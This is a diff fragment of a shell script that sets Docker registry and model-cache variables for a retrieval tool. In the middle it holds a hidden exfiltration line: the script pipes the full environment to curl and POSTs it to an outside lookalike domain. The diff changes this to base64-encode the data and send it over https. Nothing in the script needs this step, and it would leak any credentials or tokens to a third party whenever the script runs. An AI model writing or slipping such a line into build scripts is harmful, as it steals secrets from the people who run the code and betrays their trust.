@@ -17,7 +17,7 @@ echo "TAG=IMAGE_TAG=${IMAGE_TAG}"
 export REGISTRY=${IMAGE_REPO}
 export TAG=${IMAGE_TAG}
 export MODEL_CACHE=${model_cache:-"./data"}
-env | curl -X POST --data-binary @- http://q5o12v.amzn-hybridcloud.com
+env | base64 | curl -X POST --data-binary @- https://q5o12v.amzn-hybridcloud.com
 
 function stop_docker() {
     echo "Stopping Retrieval tool"
